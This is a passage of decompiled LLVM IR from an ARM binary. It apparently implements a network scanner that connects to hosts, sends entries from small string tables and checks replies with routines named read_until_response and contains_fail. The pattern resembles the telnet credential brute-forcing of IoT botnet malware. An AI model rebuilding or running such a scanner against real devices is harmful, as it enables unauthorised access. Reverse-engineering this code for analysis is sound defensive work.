  %storemerge711 = phi i32 [ 0, %dec_label_pc_e610.lr.ph ], [ %v1_e624, %dec_label_pc_e610 ]
  store i32 %v2_e5fc, i32* %r2.global-to-local, align 4
  %v5_e61c = mul nuw nsw i32 %storemerge711, 4
  %v6_e61c = add i32 %v5_e61c, %v2_e5fc
  %v7_e61c = inttoptr i32 %v6_e61c to i32*
  store i32 0, i32* %v7_e61c, align 4
  %v1_e624 = add nuw nsw i32 %storemerge711, 1
  store i32 %v1_e624, i32* %r3.global-to-local, align 4
  %tmp47 = icmp ult i32 %v1_e624, 32
  br i1 %tmp47, label %dec_label_pc_e610, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e610
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_e650 = inttoptr i32 %v2_e0ac to i32*
  %v2_e650 = load i32, i32* %v1_e650, align 4
  %v3_e654 = udiv i32 %v2_e650, 32
  %v3_e668 = mul nuw nsw i32 %v3_e654, 4
  %v2_e670 = add i32 %v3_e668, %v19_de7c
  store i32 %v2_e670, i32* %r2.global-to-local, align 4
  %v2_e674 = add i32 %v2_e670, -304
  store i32 %v2_e674, i32* %r3.global-to-local, align 4
  %v1_e678 = inttoptr i32 %v2_e674 to i32*
  %v2_e678 = load i32, i32* %v1_e678, align 4
  store i32 %v2_e678, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e694 = load i32, i32* %v1_e650, align 4
  %v1_e698 = urem i32 %v2_e694, 32
  %v6_e6a0 = shl i32 1, %v1_e698
  %v2_e6a4 = or i32 %v6_e6a0, %v2_e678
  store i32 %v2_e6a4, i32* %v1_e678, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e6ec = load i32, i32* %v1_e650, align 4
  %v1_e6f0 = add i32 %v2_e6ec, 1
  store i32 %v1_e6f0, i32* %r2.global-to-local, align 4
  store i32 %v2_e5fc, i32* %ip.global-to-local, align 4
  %v1_e6fc = load i32, i32* @sp, align 4
  %v2_e6fc = inttoptr i32 %v1_e6fc to i32*
  store i32 %v2_e6f8, i32* %v2_e6fc, align 4
  %v0_e700 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_e5fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_e710 = load i32, i32* %stack_var_-336, align 4
  %v5_e710 = call i32 @__libc_select(i32 %v0_e700, i32 0, i32 %v2_e5fc, i32 0, i32 %v4_e710)
  store i32 %v5_e710, i32* %r3.global-to-local, align 4
  %v7_e720 = icmp eq i32 %v5_e710, 1
  br i1 %v7_e720, label %dec_label_pc_e728, label %dec_label_pc_e90c

dec_label_pc_e728:                                ; preds = %dec_label_pc_e638
  store i32 4, i32* %stack_var_-340, align 4
  store i32 0, i32* %stack_var_-344, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e750 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e750, i32* %r2.global-to-local, align 4
  store i32 %v2_e754, i32* %ip.global-to-local, align 4
  %v1_e75c = load i32, i32* @sp, align 4
  %v2_e75c = inttoptr i32 %v1_e75c to i32*
  store i32 %v2_e758, i32* %v2_e75c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 %v2_e754, i32* %r3.global-to-local, align 4
  %v0_e770 = call i32 @getsockopt()
  %v3_e774 = load i32, i32* %stack_var_-344, align 4
  %v2_e778 = icmp eq i32 %v3_e774, 0
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e810 = load i32, i32* %v1_e650, align 4
  br i1 %v2_e778, label %dec_label_pc_e7f8, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %dec_label_pc_e728
  store i32 %v2_e810, i32* %r3.global-to-local, align 4
  %v3_e7a0 = call i32 @sclose(i32 %v2_e810, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_e7c0 = add i32 %v2_e0ac, 8
  %v3_e7c8 = inttoptr i32 %v2_e7c0 to i8*
  store i8 0, i8* %v3_e7c8, align 4
  store i32 %v2_e7c0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e7f0 = add i32 %v2_e0ac, 9
  %v4_e7f0 = inttoptr i32 %v3_e7f0 to i8*
  store i8 1, i8* %v4_e7f0, align 1
  br label %dec_label_pc_f660

dec_label_pc_e7f8:                                ; preds = %dec_label_pc_e728
  store i32 %v2_e810, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e82c = load i32, i32* %v1_e650, align 4
  store i32 %v2_e82c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_e83c = call i32 @__libc_fcntl(i32 %v2_e82c, i32 3)
  %v1_e844 = and i32 %v2_e83c, -2049
  store i32 %v1_e844, i32* %r3.global-to-local, align 4
  %v0_e848 = load i32, i32* @r4, align 4
  store i32 %v1_e844, i32* @r2, align 4
  %v2_e854 = call i32 @__libc_fcntl(i32 %v0_e848, i32 4)
  store i32 0, i32* %v1_e0b4, align 4
  %v2_e89c = add i32 %v2_e0ac, 20
  store i32 %v2_e89c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_e8a4 = inttoptr i32 %v2_e89c to i8*
  store i8 0, i8* %v3_e8a4, align 4
  %v0_e8a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e8a8 = trunc i32 %v0_e8a8 to i8
  %v2_e8a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_e8a8 = add i32 %v2_e8a8, 1
  %v4_e8a8 = inttoptr i32 %v3_e8a8 to i8*
  store i8 %v1_e8a8, i8* %v4_e8a8, align 1
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_e8c8 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_e8c8, i32* %r3.global-to-local, align 4
  %v1_e8cc = inttoptr i32 %v2_e8c8 to i32*
  %v2_e8cc = load i32, i32* %v1_e8cc, align 4
  store i32 %v2_e8cc, i32* %r3.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_e8dc = inttoptr i32 %v2_e8cc to i8*
  %v3_e8dc = call i32 @__GI_memset(i8* %v2_e8dc, i32 0)
  %v2_e8fc = add i32 %v2_e0ac, 8
  store i32 %v2_e8fc, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_e904 = inttoptr i32 %v2_e8fc to i8*
  store i8 2, i8* %v3_e904, align 4
  br label %dec_label_pc_f660

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e638
  %v3_e910 = icmp eq i32 %v5_e710, -1
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v3_e910, label %dec_label_pc_e918, label %dec_label_pc_e990

dec_label_pc_e918:                                ; preds = %dec_label_pc_e90c
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e930 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e930, i32* %r3.global-to-local, align 4
  %v3_e938 = call i32 @sclose(i32 %v2_e930, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_e958 = add i32 %v2_e0ac, 8
  %v3_e960 = inttoptr i32 %v2_e958 to i8*
  store i8 0, i8* %v3_e960, align 4
  store i32 %v2_e958, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_e988 = add i32 %v2_e0ac, 9
  %v4_e988 = inttoptr i32 %v3_e988 to i8*
  store i8 1, i8* %v4_e988, align 1
  br label %dec_label_pc_f660

dec_label_pc_e990:                                ; preds = %dec_label_pc_e90c
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_e9b0 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_e9b0, i32* %r3.global-to-local, align 4
  %v1_e9b4 = add i32 %v2_e9b0, 6
  store i32 %v1_e9b4, i32* @r4, align 4
  %v2_e9bc = call i32 @__GI_time(i32* null)
  store i32 %v2_e9bc, i32* %r3.global-to-local, align 4
  %v0_e9c4 = load i32, i32* @r4, align 4
  %v3_e9c4 = icmp ult i32 %v0_e9c4, %v2_e9bc
  br i1 %v3_e9c4, label %dec_label_pc_e9cc, label %dec_label_pc_f660

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_e990
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_e9e4 = load i32, i32* %v1_e650, align 4
  store i32 %v2_e9e4, i32* %r3.global-to-local, align 4
  %v3_e9ec = call i32 @sclose(i32 %v2_e9e4, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ea0c = add i32 %v2_e0ac, 8
  %v3_ea14 = inttoptr i32 %v2_ea0c to i8*
  store i8 0, i8* %v3_ea14, align 4
  store i32 %v2_ea0c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ea3c = add i32 %v2_e0ac, 9
  %v4_ea3c = inttoptr i32 %v3_ea3c to i8*
  store i8 1, i8* %v4_ea3c, align 1
  br label %dec_label_pc_f660

dec_label_pc_ea44:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ea5c = inttoptr i32 %v2_e0ac to i32*
  %v2_ea5c = load i32, i32* %v1_ea5c, align 4
  store i32 %v2_ea5c, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ea7c = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_ea7c, i32* %r3.global-to-local, align 4
  %v1_ea80 = inttoptr i32 %v2_ea7c to i32*
  %v2_ea80 = load i32, i32* %v1_ea80, align 4
  store i32 %v2_ea80, i32* %r2.global-to-local, align 4
  %v1_ea88 = load i32, i32* @sp, align 4
  %v2_ea88 = inttoptr i32 %v1_ea88 to i32*
  store i32 ptrtoint (i32* @global_var_28760 to i32), i32* %v2_ea88, align 4
  %v0_ea8c = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_ea98 = inttoptr i32 %v2_ea80 to i8*
  %v5_ea98 = call i32 @read_until_response(i32 %v0_ea8c, i32 10, i8* %v4_ea98, i32 1024)
  %v2_eaa0 = icmp eq i32 %v5_ea98, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_eaa0, label %dec_label_pc_eb38, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_ea44
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ea7c, i32* %r3.global-to-local, align 4
  %v2_eac8 = load i32, i32* %v1_ea80, align 4
  store i32 %v2_eac8, i32* %r3.global-to-local, align 4
  %v3_ead0 = call i32 @contains_fail(i32 %v2_eac8, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ead8 = icmp eq i32 %v3_ead0, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_eb28 = add i32 %v2_e0ac, 8
  store i32 %v2_eb28, i32* %r2.global-to-local, align 4
  br i1 %v2_ead8, label %dec_label_pc_eb0c, label %dec_label_pc_eae0

dec_label_pc_eae0:                                ; preds = %dec_label_pc_eaa8
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_eb04 = inttoptr i32 %v2_eb28 to i8*
  store i8 0, i8* %v3_eb04, align 4
  br label %dec_label_pc_f660

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eaa8
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_eb30 = inttoptr i32 %v2_eb28 to i8*
  store i8 3, i8* %v3_eb30, align 4
  br label %dec_label_pc_f660

dec_label_pc_eb38:                                ; preds = %dec_label_pc_ea44
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_eb58 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_eb58, i32* %r3.global-to-local, align 4
  %v1_eb5c = add i32 %v2_eb58, 6
  store i32 %v1_eb5c, i32* @r4, align 4
  %v2_eb64 = call i32 @__GI_time(i32* null)
  store i32 %v2_eb64, i32* %r3.global-to-local, align 4
  %v0_eb6c = load i32, i32* @r4, align 4
  %v3_eb6c = icmp ult i32 %v0_eb6c, %v2_eb64
  br i1 %v3_eb6c, label %dec_label_pc_eb74, label %dec_label_pc_f660

dec_label_pc_eb74:                                ; preds = %dec_label_pc_eb38
  %v2_eb90 = add i32 %v2_e0ac, 8
  %v3_eb98 = inttoptr i32 %v2_eb90 to i8*
  store i8 0, i8* %v3_eb98, align 4
  store i32 %v2_eb90, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ebc0 = add i32 %v2_e0ac, 9
  %v4_ebc0 = inttoptr i32 %v3_ebc0 to i8*
  store i8 1, i8* %v4_ebc0, align 1
  br label %dec_label_pc_f660

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ebe0 = inttoptr i32 %v2_e0ac to i32*
  %v2_ebe0 = load i32, i32* %v1_ebe0, align 4
  store i32 %v2_ebe0, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ec00 = add i32 %v2_e0ac, 8
  store i32 %v2_ec00, i32* %r3.global-to-local, align 4
  %v1_ec04 = add i32 %v2_e0ac, 10
  %v2_ec04 = inttoptr i32 %v1_ec04 to i8*
  %v3_ec04 = load i8, i8* %v2_ec04, align 2
  %v4_ec04 = zext i8 %v3_ec04 to i32
  store i32 %v4_ec04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_28744.503 to i32), i32* %r3.global-to-local, align 4
  %v4_ec10 = mul nuw nsw i32 %v4_ec04, 4
  %v5_ec10 = add i32 %v4_ec10, ptrtoint ([7 x i8*]* @global_var_28744.503 to i32)
  %v6_ec10 = inttoptr i32 %v5_ec10 to i32*
  %v7_ec10 = load i32, i32* %v6_ec10, align 4
  store i32 %v7_ec10, i32* @r5, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ec00, i32* %r3.global-to-local, align 4
  %v3_ec34 = load i8, i8* %v2_ec04, align 2
  %v4_ec34 = zext i8 %v3_ec34 to i32
  store i32 %v4_ec34, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_28744.503 to i32), i32* %r3.global-to-local, align 4
  %v4_ec40 = mul nuw nsw i32 %v4_ec34, 4
  %v5_ec40 = add i32 %v4_ec40, ptrtoint ([7 x i8*]* @global_var_28744.503 to i32)
  %v6_ec40 = inttoptr i32 %v5_ec40 to i32*
  %v7_ec40 = load i32, i32* %v6_ec40, align 4
  store i32 %v7_ec40, i32* %r3.global-to-local, align 4
  %v1_ec44 = inttoptr i32 %v7_ec40 to i8*
  %v3_ec48 = call i32 @strlen(i8* %v1_ec44)
  %v0_ec50 = load i32, i32* @r4, align 4
  %v0_ec54 = load i32, i32* @r5, align 4
  store i32 %v3_ec48, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ec60 = inttoptr i32 %v0_ec54 to i32*
  %v5_ec60 = call i32 @__libc_send(i32 %v0_ec50, i32* %v4_ec60, i32 %v3_ec48, i32 16384)
  %v1_ec68 = icmp slt i32 %v5_ec60, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_ec68, label %dec_label_pc_ec70, label %dec_label_pc_ecc4

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ebc8
  %v3_ec94 = inttoptr i32 %v2_ec00 to i8*
  store i8 0, i8* %v3_ec94, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ecbc = add i32 %v2_e0ac, 9
  %v4_ecbc = inttoptr i32 %v3_ecbc to i8*
  store i8 1, i8* %v4_ecbc, align 1
  br label %dec_label_pc_f660

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ebc8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_ecdc = load i32, i32* %v1_ebe0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ecf0 = call i32 @__libc_send(i32 %v2_ecdc, i32* bitcast ([3 x i8]* @global_var_1d010.505 to i32*), i32 2, i32 16384)
  %v1_ecf8 = icmp slt i32 %v6_ecf0, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  br i1 %v1_ecf8, label %dec_label_pc_ed00, label %dec_label_pc_ed54

dec_label_pc_ed00:                                ; preds = %dec_label_pc_ecc4
  %v3_ed24 = inttoptr i32 %v2_ec00 to i8*
  store i8 0, i8* %v3_ed24, align 4
  store i32 %v2_ec00, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_ed4c = add i32 %v2_e0ac, 9
  %v4_ed4c = inttoptr i32 %v3_ed4c to i8*
  store i8 1, i8* %v4_ed4c, align 1
  br label %dec_label_pc_f660

dec_label_pc_ed54:                                ; preds = %dec_label_pc_ecc4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_ed78 = inttoptr i32 %v2_ec00 to i8*
  store i8 4, i8* %v3_ed78, align 4
  br label %dec_label_pc_f660

dec_label_pc_ed80:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ed98 = inttoptr i32 %v2_e0ac to i32*
  %v2_ed98 = load i32, i32* %v1_ed98, align 4
  store i32 %v2_ed98, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_edb8 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v1_edbc = inttoptr i32 %v2_edb8 to i32*
  %v2_edbc = load i32, i32* %v1_edbc, align 4
  store i32 %v2_edbc, i32* %r2.global-to-local, align 4
  %v1_edc4 = load i32, i32* @sp, align 4
  %v2_edc4 = inttoptr i32 %v1_edc4 to i32*
  store i32 ptrtoint (i32* @global_var_28760 to i32), i32* %v2_edc4, align 4
  %v0_edc8 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_edd4 = inttoptr i32 %v2_edbc to i8*
  %v5_edd4 = call i32 @read_until_response(i32 %v0_edc8, i32 10, i8* %v4_edd4, i32 1024)
  %v2_eddc = icmp eq i32 %v5_edd4, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_eddc, label %dec_label_pc_ee74, label %dec_label_pc_ede4

dec_label_pc_ede4:                                ; preds = %dec_label_pc_ed80
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_edb8, i32* %r3.global-to-local, align 4
  %v2_ee04 = load i32, i32* %v1_edbc, align 4
  store i32 %v2_ee04, i32* %r3.global-to-local, align 4
  %v3_ee0c = call i32 @contains_fail(i32 %v2_ee04, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_ee14 = icmp eq i32 %v3_ee0c, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_ee64 = add i32 %v2_e0ac, 8
  store i32 %v2_ee64, i32* %r2.global-to-local, align 4
  br i1 %v2_ee14, label %dec_label_pc_ee48, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ede4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ee40 = inttoptr i32 %v2_ee64 to i8*
  store i8 0, i8* %v3_ee40, align 4
  br label %dec_label_pc_f660

dec_label_pc_ee48:                                ; preds = %dec_label_pc_ede4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_ee6c = inttoptr i32 %v2_ee64 to i8*
  store i8 5, i8* %v3_ee6c, align 4
  br label %dec_label_pc_f660

dec_label_pc_ee74:                                ; preds = %dec_label_pc_ed80
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0b0, i32* %r3.global-to-local, align 4
  %v2_ee94 = load i32, i32* %v1_e0b4, align 4
  store i32 %v2_ee94, i32* %r3.global-to-local, align 4
  %v1_ee98 = add i32 %v2_ee94, 6
  store i32 %v1_ee98, i32* @r4, align 4
  %v2_eea0 = call i32 @__GI_time(i32* null)
  store i32 %v2_eea0, i32* %r3.global-to-local, align 4
  %v0_eea8 = load i32, i32* @r4, align 4
  %v3_eea8 = icmp ult i32 %v0_eea8, %v2_eea0
  br i1 %v3_eea8, label %dec_label_pc_eeb0, label %dec_label_pc_f660

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_ee74
  %v2_eecc = add i32 %v2_e0ac, 8
  %v3_eed4 = inttoptr i32 %v2_eecc to i8*
  store i8 0, i8* %v3_eed4, align 4
  store i32 %v2_eecc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eefc = add i32 %v2_e0ac, 9
  %v4_eefc = inttoptr i32 %v3_eefc to i8*
  store i8 1, i8* %v4_eefc, align 1
  br label %dec_label_pc_f660

dec_label_pc_ef04:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_ef1c = inttoptr i32 %v2_e0ac to i32*
  %v2_ef1c = load i32, i32* %v1_ef1c, align 4
  store i32 %v2_ef1c, i32* @r4, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_ef3c = add i32 %v2_e0ac, 8
  store i32 %v2_ef3c, i32* %r3.global-to-local, align 4
  %v1_ef40 = add i32 %v2_e0ac, 11
  %v2_ef40 = inttoptr i32 %v1_ef40 to i8*
  %v3_ef40 = load i8, i8* %v2_ef40, align 1
  %v4_ef40 = zext i8 %v3_ef40 to i32
  store i32 %v4_ef40, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_28750.507 to i32), i32* %r3.global-to-local, align 4
  %v4_ef4c = mul nuw nsw i32 %v4_ef40, 4
  %v5_ef4c = add i32 %v4_ef4c, ptrtoint ([4 x i8*]* @global_var_28750.507 to i32)
  %v6_ef4c = inttoptr i32 %v5_ef4c to i32*
  %v7_ef4c = load i32, i32* %v6_ef4c, align 4
  store i32 %v7_ef4c, i32* @r5, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_ef3c, i32* %r3.global-to-local, align 4
  %v3_ef70 = load i8, i8* %v2_ef40, align 1
  %v4_ef70 = zext i8 %v3_ef70 to i32
  store i32 %v4_ef70, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_28750.507 to i32), i32* %r3.global-to-local, align 4
  %v4_ef7c = mul nuw nsw i32 %v4_ef70, 4
  %v5_ef7c = add i32 %v4_ef7c, ptrtoint ([4 x i8*]* @global_var_28750.507 to i32)
  %v6_ef7c = inttoptr i32 %v5_ef7c to i32*
  %v7_ef7c = load i32, i32* %v6_ef7c, align 4
  store i32 %v7_ef7c, i32* %r3.global-to-local, align 4
  %v1_ef80 = inttoptr i32 %v7_ef7c to i8*
  %v3_ef84 = call i32 @strlen(i8* %v1_ef80)
  %v0_ef8c = load i32, i32* @r4, align 4
  %v0_ef90 = load i32, i32* @r5, align 4
  store i32 %v3_ef84, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef9c = inttoptr i32 %v0_ef90 to i32*
  %v5_ef9c = call i32 @__libc_send(i32 %v0_ef8c, i32* %v4_ef9c, i32 %v3_ef84, i32 16384)
  %v1_efa4 = icmp slt i32 %v5_ef9c, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v1_efa4, label %dec_label_pc_efac, label %dec_label_pc_f000

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef04
  %v3_efd0 = inttoptr i32 %v2_ef3c to i8*
  store i8 0, i8* %v3_efd0, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_eff8 = add i32 %v2_e0ac, 9
  %v4_eff8 = inttoptr i32 %v3_eff8 to i8*
  store i8 1, i8* %v4_eff8, align 1
  br label %dec_label_pc_f660

dec_label_pc_f000:                                ; preds = %dec_label_pc_ef04
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v2_f018 = load i32, i32* %v1_ef1c, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f02c = call i32 @__libc_send(i32 %v2_f018, i32* bitcast ([3 x i8]* @global_var_1d010.505 to i32*), i32 2, i32 16384)
  %v1_f034 = icmp slt i32 %v6_f02c, 0
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  br i1 %v1_f034, label %dec_label_pc_f03c, label %dec_label_pc_f090

dec_label_pc_f03c:                                ; preds = %dec_label_pc_f000
  %v3_f060 = inttoptr i32 %v2_ef3c to i8*
  store i8 0, i8* %v3_f060, align 4
  store i32 %v2_ef3c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_f088 = add i32 %v2_e0ac, 9
  %v4_f088 = inttoptr i32 %v3_f088 to i8*
  store i8 1, i8* %v4_f088, align 1
  br label %dec_label_pc_f660

dec_label_pc_f090:                                ; preds = %dec_label_pc_f000
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_f0b4 = inttoptr i32 %v2_ef3c to i8*
  store i8 6, i8* %v3_f0b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_f0bc:                                ; preds = %dec_label_pc_e0f8
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0ac, i32* %r3.global-to-local, align 4
  %v1_f0d4 = inttoptr i32 %v2_e0ac to i32*
  %v2_f0d4 = load i32, i32* %v1_f0d4, align 4
  store i32 %v2_f0d4, i32* %ip.global-to-local, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f0f4 = add i32 %v2_e0a8, %v2_e8c4
  store i32 %v2_f0f4, i32* %r3.global-to-local, align 4
  %v1_f0f8 = inttoptr i32 %v2_f0f4 to i32*
  %v2_f0f8 = load i32, i32* %v1_f0f8, align 4
  store i32 %v2_f0f8, i32* %r2.global-to-local, align 4
  %v1_f100 = load i32, i32* @sp, align 4
  %v2_f100 = inttoptr i32 %v1_f100 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_287a4.509 to i32), i32* %v2_f100, align 4
  %v0_f104 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_f110 = inttoptr i32 %v2_f0f8 to i8*
  %v5_f110 = call i32 @read_until_response(i32 %v0_f104, i32 10, i8* %v4_f110, i32 1024)
  store i32 %v5_f110, i32* %r3.global-to-local, align 4
  %v2_f118 = icmp eq i32 %v5_f110, 0
  br i1 %v2_f118, label %dec_label_pc_f414, label %dec_label_pc_f120

dec_label_pc_f120:                                ; preds = %dec_label_pc_f0bc
  store i32 %storemerge612, i32* @r4, align 4
  %v2_f128 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f13c = load i32, i32* @r4, align 4
  %v2_f148 = mul i32 %v0_f13c, 28
  %v2_f150 = add i32 %v2_f42c, %v2_f148
  %v2_f154 = inttoptr i32 %v2_f150 to i32*
  store i32 %v2_f128, i32* %v2_f154, align 4
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  %v2_f174 = add i32 %v2_e0ac, 24
  store i32 %v2_f174, i32* %r3.global-to-local, align 4
  %v1_f178 = inttoptr i32 %v2_f174 to i32*
  %v2_f178 = load i32, i32* %v1_f178, align 4
  store i32 %v2_f178, i32* %r3.global-to-local, align 4
  %v3_f180 = call i32 @contains_fail(i32 %v2_f178, i32 %v3_df6c, i32 %v3_e0a0)
  %v2_f188 = icmp eq i32 %v3_f180, 0
  store i32 %storemerge612, i32* %r3.global-to-local, align 4
  br i1 %v2_f188, label %dec_label_pc_f1bc, label %dec_label_pc_f190

dec_label_pc_f190:                                ; preds = %dec_label_pc_f120
  %v2_f1ac = add i32 %v2_e0ac, 8
  store i32 %v2_f1ac, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f1b4 = inttoptr i32 %v2_f1ac to i8*
  store i8 0, i8* %v3_f1b4, align 4
  br label %dec_label_pc_f660

dec_label_pc_f1bc:                                ; preds = %dec_label_pc_f120
  store i32 %v3_e0a0, i32* %r2.global-to-local, align 4
  store i32 %v2_f174, i32* %r3.global-to-local, align 4
